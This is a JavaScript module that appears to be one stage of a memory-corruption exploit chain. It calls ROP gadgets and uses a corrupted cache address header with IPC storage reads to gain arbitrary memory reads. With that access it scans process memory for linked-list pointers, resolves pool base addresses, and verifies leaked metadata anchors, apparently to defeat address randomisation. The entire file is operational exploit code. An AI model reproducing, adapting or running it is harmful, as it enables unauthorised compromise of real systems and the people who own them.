import coreRuntime from "../runtime.mjs";
import {
  buffersEqualFast,
  checkAddressHeaderEncoding,
  hasByteDifferentFast,
  readFsAddressBytes,
  readHexBytes
} from "./util.mjs";
import {installAddressHeader} from "./cache.mjs";
import {scanNativeLinkBuffer} from "./scan.mjs";

const {
  AnalysisBytes,
  CachePlan,
  GADGET_MEMSET,
  RootLayout,
  allocPage,
  call_rop,
  hex32,
  ipcStorageRead,
  read64
} = coreRuntime;

// ── Pool and metadata discovery ───────────────────────────────────────────

export async function reportMetadataProgress(input, message) {
    if (typeof input.reportProgress !== "function") return;

    await input.reportProgress(message);
}

async function readExternalLinkWindow(input) {
    var result = await readFsAddressBytes({...input,
        materializeBytes: false});
    // A candidate in the final cycle bytes needs a second cache-chunk read.
    // Keep the existing materialized path for that boundary case.
    if (!result.ok && result.error ===
        "buffer-only reads require one aligned cache chunk")
        result = await readFsAddressBytes(input);
    return result;
}

function extractExternalLinkFields(result, offset) {
    if (result.bytes) {
        return {
            next: AnalysisBytes.readU64LE(result.bytes, offset),
            previous: AnalysisBytes.readU64LE(result.bytes, offset + 8),
            extent: AnalysisBytes.readU64LE(result.bytes, offset + 16)
        };
    }
    var base = result.buffer + BigInt((result.bufferOffset || 0) + offset);
    return {next: read64(base), previous: read64(base + 8n),
        extent: read64(base + 16n)};
}

function externalLinkFieldsBytes(fields) {
    var bytes = new Array(24);
    AnalysisBytes.writeU64LE(bytes, 0, fields.next);
    AnalysisBytes.writeU64LE(bytes, 8, fields.previous);
    AnalysisBytes.writeU64LE(bytes, 16, fields.extent);
    return bytes;
}

export async function resolvePoolCandidates(seed, sourceLinks, outputBuf, label, input) {
    const config = input.config;
    let addressPlan = input.addressPlan;
    let candidateHandle = input.candidateHandle;
    // The payload reserves live progress logs for external-link checks;
    // callers without a progress callback retain the detailed scan logs.
    var links = sourceLinks.slice();
    var captures = [{address: seed, length: 0x500000}];
    var seen = {};
    for (var si = 0; si < links.length; si++)
        seen[links[si].source.toString(16) + ":" +
            links[si].value.toString(16)] = true;

    for (var refinement = 0;
        refinement <= config.MAX_POOL_REFINEMENT_READS; refinement++) {
        var bounds = RootLayout.derivePoolBounds(links, seed, {controlSize: config.CONTROL_SIZE});
        if (!bounds.candidates.length) {
            if (!input.reportProgress)
                await reportMetadataProgress(input, "METADATA " + label +
                    ": no pool hypothesis fits " + links.length +
                    " native links");
            return {ok: true, candidates: [], links: links.length,
                refinementReads: refinement};
        }
        if (bounds.candidates.length <= config.MAX_POOL_ANCHOR_CANDIDATES) {
            // The payload reports the combined scan result after the
            // external-link checks. Keep this detail for legacy log callers.
            if (!input.reportProgress)
                await reportMetadataProgress(input, "METADATA " + label +
                    ": pool bounds resolved " + bounds.candidates.length +
                    " candidate(s), links=" + links.length +
                    " refinements=" + refinement);
            return {ok: true, candidates: bounds.candidates,
                links: links.length, refinementReads: refinement};
        }
        if (refinement === config.MAX_POOL_REFINEMENT_READS) {
            if (!input.reportProgress)
                await reportMetadataProgress(input, "METADATA " + label +
                    ": pool bounds remain ambiguous after " + refinement +
                    " refinement reads (" + bounds.candidates.length +
                    " candidates); checking their external-link locations " +
                    "within the remaining budget");
            return {ok: true, candidates: bounds.candidates, unresolved: true,
                links: links.length, refinementReads: refinement};
        }

        var readStart = RootLayout.choosePoolRefinementStart(bounds, links, captures,
            addressPlan.addressBias, config.ROOT_CAPTURE_CHUNK, refinement,
            {controlSize: config.CONTROL_SIZE, maxPoolCandidates: config.MAX_POOL_ANCHOR_CANDIDATES});
        if (readStart === null) {
            if (!input.reportProgress)
                await reportMetadataProgress(input, "METADATA " + label +
                    ": no uncovered bucket lies inside all pool hypotheses; " +
                    "checking " + bounds.candidates.length +
                    " candidate external-link locations");
            return {ok: true, candidates: bounds.candidates, unresolved: true,
                links: links.length, refinementReads: refinement};
        }
        var chunkWindow = {start: readStart,
            end: readStart + config.ROOT_CAPTURE_CHUNK};
        var chunkRead = await readFsAddressBytes({config, addressPlan,
            candidateHandle, address: readStart,
            length: config.ROOT_CAPTURE_CHUNK, outputBuf,
            allowedWindow: chunkWindow, materializeBytes: false});
        if (!chunkRead.ok) return {ok: false,
            continueSeed: !chunkRead.fatal, error: chunkRead.error};
        var scannedLinks = scanNativeLinkBuffer({buffer: chunkRead.buffer,
            bufferOffset: chunkRead.bufferOffset,
            length: config.ROOT_CAPTURE_CHUNK, sourceAddress: readStart,
            seed, links, seen, config});
        links = scannedLinks.links;
        seen = scannedLinks.seen;
        captures.push({address: readStart, length: config.ROOT_CAPTURE_CHUNK});
        if (!input.reportProgress) {
            await reportMetadataProgress(input, "METADATA " + label +
                ": pool refinement " + (refinement + 1) + "/" +
                config.MAX_POOL_REFINEMENT_READS + " links=" + links.length +
                " candidates=" + RootLayout.derivePoolBounds(links, seed,
                    {controlSize: config.CONTROL_SIZE}).candidates.length);
        }
    }
    var finalBounds = RootLayout.derivePoolBounds(links, seed,
        {controlSize: config.CONTROL_SIZE});
    return {ok: true, candidates: finalBounds.candidates, unresolved: true,
        links: links.length, refinementReads: config.MAX_POOL_REFINEMENT_READS};
}

export async function discoverMetadataAnchors(seedPlan, label, input) {
    const withStepData = (result) => ({...result, metadataAnchorChecks, addressPlan});
    const config = input.config;
    let addressPlan = input.addressPlan;
    let candidateHandle = input.candidateHandle;
    let metadataAnchorChecks = input.metadataAnchorChecks;
    addressPlan = seedPlan;
    if (metadataAnchorChecks >= config.MAX_METADATA_ANCHOR_CHECKS)
        return withStepData({ok: true, anchors: [], continueSeed: false,
            capReached: true});
    var seed = Number(seedPlan.target);
    var sourceLength = 0x500000;
    var sourceEnd = seed + sourceLength;
    if (!Number.isSafeInteger(seed) || !Number.isSafeInteger(sourceEnd) ||
        seed % config.CONTROL_SIZE !== 0 || sourceEnd >= 0x8000000000) {
        return withStepData({ok: false, continueSeed: true,
            error: "seed capture bounds are not canonical/aligned"});
    }

    if (!input.reportProgress)
        await reportMetadataProgress(input, "METADATA " + label +
            ": reading seed window [0x" + seed.toString(16) + ",0x" +
            sourceEnd.toString(16) + ") bytes=0x500000 chunks=32");
    var captureBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 0x2000);
    if (!captureBuf) return withStepData({ok: false, continueSeed: false,
        error: "seed capture buffer allocation failed"});
    var links = [];
    var seen = {};
    var sourceWindow = {start: seed, end: sourceEnd};
    for (var chunkIndex = 0; chunkIndex < 0x500000 / config.ROOT_CAPTURE_CHUNK;
        chunkIndex++) {
        var chunkAddress = seed + chunkIndex * config.ROOT_CAPTURE_CHUNK;
        var chunkRead = await readFsAddressBytes({config, addressPlan,
            candidateHandle, address: chunkAddress,
            length: config.ROOT_CAPTURE_CHUNK, outputBuf: captureBuf,
            allowedWindow: sourceWindow, materializeBytes: false});
        if (!chunkRead.ok) return withStepData({ok: false,
            continueSeed: !chunkRead.fatal, error: "seed chunk " +
                chunkIndex + ": " + chunkRead.error});
        var scannedLinks = scanNativeLinkBuffer({buffer: chunkRead.buffer,
            bufferOffset: chunkRead.bufferOffset,
            length: config.ROOT_CAPTURE_CHUNK, sourceAddress: chunkAddress,
            seed, links, seen, config});
        links = scannedLinks.links;
        seen = scannedLinks.seen;
        if ((chunkIndex + 1) % 8 === 0 &&
            chunkIndex + 1 < 0x500000 / config.ROOT_CAPTURE_CHUNK) {
            await reportMetadataProgress(input, "METADATA " + label + ": seed progress=" +
                (chunkIndex + 1) + "/32 links=" + links.length);
        }
    }
    await reportMetadataProgress(input, "METADATA " + label +
        ": seed capture complete; native links=" + links.length);
    if (!links.length) return withStepData({ok: true, anchors: [],
        continueSeed: true, poolCandidates: 0, externalLinkChecks: 0});

    var poolResult = await resolvePoolCandidates(seed, links, captureBuf,
        label, {config, addressPlan, candidateHandle,
            reportProgress: input.reportProgress});
    if (!poolResult.ok) return withStepData({ok: false,
        continueSeed: poolResult.continueSeed, error: poolResult.error});
    if (!poolResult.candidates.length) {
        return withStepData({ok: true, anchors: [], continueSeed: true,
            unresolved: Boolean(poolResult.unresolved), poolCandidates: 0,
            nativeLinks: poolResult.links,
            refinementReads: poolResult.refinementReads,
            externalLinkChecks: 0, poolCandidatesVisited: 0});
    }

    var anchors = [];
    var anchorSeen = {};
    var externalLinkChecks = 0;
    var poolCandidatesVisited = 0;
    for (var poolIndex = 0;
        poolIndex < poolResult.candidates.length &&
            metadataAnchorChecks < config.MAX_METADATA_ANCHOR_CHECKS; poolIndex++) {
        poolCandidatesVisited = poolIndex + 1;
        var poolStart = poolResult.candidates[poolIndex];
        var anchorAddress = poolStart + 0x3a00000;
        if (!Number.isSafeInteger(anchorAddress) ||
            anchorAddress < 0x100000000 || anchorAddress >= 0x8000000000) {
            continue;
        }
        var alignedStart = seedPlan.addressBias + Math.floor(
            (anchorAddress - seedPlan.addressBias) / config.ROOT_CAPTURE_CHUNK) *
            config.ROOT_CAPTURE_CHUNK;
        var anchorOffset = anchorAddress - alignedStart;
        var anchorLength = anchorOffset + 0x1000;
        var anchorWindow = {start: alignedStart,
            end: alignedStart + anchorLength};
        metadataAnchorChecks++;
        externalLinkChecks++;
        await reportMetadataProgress(input, "METADATA " + label +
            ": checking external-link candidate " + (poolIndex + 1) + "/" +
            poolResult.candidates.length + " (check " + externalLinkChecks +
            "/" + config.MAX_METADATA_ANCHOR_CHECKS + ")");
        var linkReadA = await readExternalLinkWindow({config, addressPlan,
            candidateHandle, address: alignedStart, length: anchorLength,
            outputBuf: captureBuf, allowedWindow: anchorWindow});
        if (!linkReadA.ok) {
            if (linkReadA.fatal) {
                if (anchors.length > 0) {
                    return withStepData({ok: true, anchors: anchors, continueSeed: false,
                        stopAfterAnchors: true, error: linkReadA.error});
                }
                return withStepData({ok: false, continueSeed: false,
                    error: linkReadA.error});
            }
            continue;
        }
        var linkFieldsA = extractExternalLinkFields(linkReadA, anchorOffset);
        var linkReadB = await readExternalLinkWindow({config, addressPlan,
            candidateHandle, address: alignedStart, length: anchorLength,
            outputBuf: captureBuf, allowedWindow: anchorWindow});
        if (!linkReadB.ok) {
            if (linkReadB.fatal) {
                if (anchors.length > 0) {
                    return withStepData({ok: true, anchors: anchors, continueSeed: false,
                        stopAfterAnchors: true, error: linkReadB.error});
                }
                return withStepData({ok: false, continueSeed: false,
                    error: linkReadB.error});
            }
            continue;
        }
        var linkFieldsB = extractExternalLinkFields(linkReadB, anchorOffset);
        var nextA = linkFieldsA.next;
        var previousA = linkFieldsA.previous;
        var extentA = linkFieldsA.extent;
        var nextB = linkFieldsB.next;
        var previousB = linkFieldsB.previous;
        var extentB = linkFieldsB.extent;
        var stableNext = nextA === nextB;
        var stablePrevious = previousA === previousB;
        var stableExtent = extentA === extentB;
        var stableLink = stableNext && stablePrevious && stableExtent;
        var nextShapeOk = nextA >= 0x100000000n &&
            nextA < 0x8000000000n && nextA % 8n === 0n;
        var reciprocalOk = nextA === previousA;
        var linkDistance = nextA >= BigInt(anchorAddress)
            ? nextA - BigInt(anchorAddress)
            : BigInt(anchorAddress) - nextA;
        var distanceOk = linkDistance > 0x8000000n;
        var extentShapeOk = extentA >= 0x10000n &&
            extentA <= 0x10000000n && extentA % 0x1000n === 0n;
        var externalLink = stableLink
            ? RootLayout.parseExternalLink(
                externalLinkFieldsBytes(linkFieldsA), 0, anchorAddress)
            : null;
        if (!externalLink) {
            var rejectionReasons = [];
            if (!stableLink) rejectionReasons.push("fields-unstable");
            if (!nextShapeOk) rejectionReasons.push("next-shape");
            if (!reciprocalOk) rejectionReasons.push("not-reciprocal");
            if (!distanceOk) rejectionReasons.push("next-distance");
            if (!extentShapeOk) rejectionReasons.push("extent-shape");
            if (!rejectionReasons.length) rejectionReasons.push("parser-rejected");
            continue;
        }
        var metadataWindow = RootLayout.metadataWindowFromNext(externalLink.next);
        if (!metadataWindow || metadataWindow.anchorOffset + 16 >
            metadataWindow.length) {
            continue;
        }
        var anchorKey = metadataWindow.address.toString(16) + ":" +
            anchorAddress.toString(16);
        if (anchorSeen[anchorKey]) continue;
        anchorSeen[anchorKey] = true;
        anchors.push({poolStart: poolStart, nodeAddress: anchorAddress,
            next: Number(externalLink.next), extent: Number(externalLink.extent),
            window: metadataWindow});
    }
    var anchorsRemaining = poolCandidatesVisited < poolResult.candidates.length;
    return withStepData({ok: true, anchors: anchors,
        continueSeed: anchors.length === 0,
        capReached: anchorsRemaining &&
            metadataAnchorChecks >= config.MAX_METADATA_ANCHOR_CHECKS,
        unresolved: Boolean(poolResult.unresolved),
        poolCandidates: poolResult.candidates.length,
        poolCandidatesVisited,
        externalLinkChecks,
        nativeLinks: poolResult.links,
        refinementReads: poolResult.refinementReads});
}

export async function qualifyMetadataPage(anchor, label, pointerTargets, input) {
    const withStepData = (result) => ({...result, addressPlan, addressCopy});
    const config = input.config;
    let addressPlan = input.addressPlan;
    let metadataPageProbes = input.metadataPageProbes;
    let storageHandle = input.storageHandle;
    let candidateHandle = input.candidateHandle;
    let savedHandle = input.savedHandle;
    let addressCopy = input.addressCopy;
    var page = anchor.window.address;
    var plan;
    try {
        var alignedTargets = pointerTargets.slice();
        alignedTargets.push(Math.floor(page / config.CONTROL_SIZE) * config.CONTROL_SIZE);
        plan = CachePlan.buildLowerWindowPlan(page, addressPlan.storageSize,
            config.ROOT_CAPTURE_CHUNK, alignedTargets);
    } catch (planError) {
        return withStepData({ok: false, continueScan: true});
    }
    var encoding = checkAddressHeaderEncoding(plan.bytes, {savedHandle});
    if (!encoding.ok) {
        return withStepData({ok: false, continueScan: true});
    }
    var window = anchor.window;
    if (window.anchorOffset < 0 || window.anchorOffset + 16 > window.length ||
        page < 0x100000000 || page + window.length >= 0x8000000000) {
        return withStepData({ok: false, continueScan: true});
    }
    var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
    var pageBufA = allocPage(config.CONTROL_SIZE + 0x2000);
    var pageBufB = allocPage(config.CONTROL_SIZE + 0x2000);
    if (!ordinaryBuf || !pageBufA || !pageBufB)
        return withStepData({ok: false, continueScan: false,
            error: "metadata page buffer allocation failed"});
    call_rop(GADGET_MEMSET, ordinaryBuf, 0xA5n, BigInt(window.length));
    var ordinaryRead = ipcStorageRead(storageHandle, plan.readOffset,
        window.length, ordinaryBuf);
    if (ordinaryRead.error !== 0) return withStepData({ok: false,
        continueScan: false, error: "ordinary metadata control=" +
            hex32(ordinaryRead.error)});
    if (!hasByteDifferentFast(ordinaryBuf, window.length, 0xA5))
        return withStepData({ok: false, continueScan: false,
            error: "ordinary metadata control remained poison"});

    var headerCopy = await installAddressHeader({...addressCopy,
        desiredBytes: plan.bytes,
        stageName: "cache-metadata-page-" + metadataPageProbes,
        shouldStop: input.shouldStop});
    addressCopy = headerCopy.addressCopy;
    if (!headerCopy.ok) {
        return withStepData({ok: false, continueScan: false,
            error: "metadata page header copy failed"});
    }
    addressPlan = plan;
    var pageWindow = {start: page, end: page + window.length};
    var pageReadA = await readFsAddressBytes({config, addressPlan,
        candidateHandle, address: page, length: window.length,
        outputBuf: pageBufA, allowedWindow: pageWindow});
    if (!pageReadA.ok) return withStepData({ok: false,
        continueScan: !pageReadA.fatal, error: pageReadA.error});
    var pageReadB = await readFsAddressBytes({config, addressPlan,
        candidateHandle, address: page, length: window.length,
        outputBuf: pageBufB, allowedWindow: pageWindow});
    if (!pageReadB.ok) return withStepData({ok: false,
        continueScan: !pageReadB.fatal, error: pageReadB.error});
    var expectedNode = BigInt(anchor.nodeAddress);
    var firstA = AnalysisBytes.readU64LE(pageReadA.bytes, window.anchorOffset);
    var previousA = AnalysisBytes.readU64LE(pageReadA.bytes,
        window.anchorOffset + 8);
    var firstB = AnalysisBytes.readU64LE(pageReadB.bytes, window.anchorOffset);
    var previousB = AnalysisBytes.readU64LE(pageReadB.bytes,
        window.anchorOffset + 8);
    var stableAnchor = firstA === firstB && previousA === previousB;
    var reciprocalAnchor = firstA === expectedNode &&
        previousA === expectedNode && firstB === expectedNode &&
        previousB === expectedNode;
    var ordinaryFirst = read64(ordinaryBuf + BigInt(window.anchorOffset));
    var ordinaryPrevious = read64(ordinaryBuf +
        BigInt(window.anchorOffset + 8));
    var ordinaryAnchorDiffers = ordinaryFirst !== expectedNode ||
        ordinaryPrevious !== expectedNode;
    var verified = stableAnchor && reciprocalAnchor && ordinaryAnchorDiffers;
    return withStepData({ok: verified, continueScan: true, plan: plan,
        page: page, window: window});
}

export async function verifyAddressCandidate(plan, label, index, input) {
    const withStepData = (result) => ({...result, addressPlan, addressCopy});
    const config = input.config;
    let addressPlan = input.addressPlan;
    let candidateHandle = input.candidateHandle;
    let storageHandle = input.storageHandle;
    let addressCopy = input.addressCopy;
    addressPlan = plan;
    var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
    if (!ordinaryBuf) {
        return withStepData({verified: false, continueScan: false});
    }
    call_rop(GADGET_MEMSET, ordinaryBuf, 0xA5n, BigInt(config.CONTROL_SIZE));
    var ordinaryReply = ipcStorageRead(storageHandle, plan.readOffset,
        config.CONTROL_SIZE, ordinaryBuf);
    if (ordinaryReply.error !== 0) {
        return withStepData({verified: false, continueScan: false});
    }

    var headerCopy = await installAddressHeader({...addressCopy,
        desiredBytes: plan.bytes, stageName: "cache-address-" + index,
        shouldStop: input.shouldStop});
    addressCopy = headerCopy.addressCopy;
    if (!headerCopy.ok) {
        return withStepData({verified: false, continueScan: false});
    }

    var addressBufA = allocPage(config.CONTROL_SIZE + 0x2000);
    var addressBufB = allocPage(config.CONTROL_SIZE + 0x2000);
    if (!addressBufA || !addressBufB) {
        return withStepData({verified: false, continueScan: false});
    }
    call_rop(GADGET_MEMSET, addressBufA, 0xA5n, BigInt(config.CONTROL_SIZE));
    call_rop(GADGET_MEMSET, addressBufB, 0x5An, BigInt(config.CONTROL_SIZE));

    var readA = ipcStorageRead(candidateHandle, plan.readOffset,
        config.CONTROL_SIZE, addressBufA);
    var readB = ipcStorageRead(candidateHandle, plan.readOffset,
        config.CONTROL_SIZE, addressBufB);
    var stable = readA.error === 0 && readB.error === 0 &&
        buffersEqualFast(addressBufA, addressBufB, config.CONTROL_SIZE);
    var differsFromControl = readA.error === 0 &&
        !buffersEqualFast(addressBufA, ordinaryBuf, config.CONTROL_SIZE);
    var changedFromPoison = readA.error === 0 &&
        hasByteDifferentFast(addressBufA, config.CONTROL_SIZE, 0xA5);
    var linkHead = readA.error === 0 ? read64(addressBufA) : 0n;
    var linkHeadShape = linkHead === 0n ||
        (linkHead >= 0x100000000n && linkHead < 0x8000000000n &&
            linkHead % 0x4000n === 0n);
    var verified = stable && differsFromControl && changedFromPoison &&
        linkHeadShape;
    return withStepData({verified: verified,
        continueScan: readA.error === 0 && readB.error === 0});
}
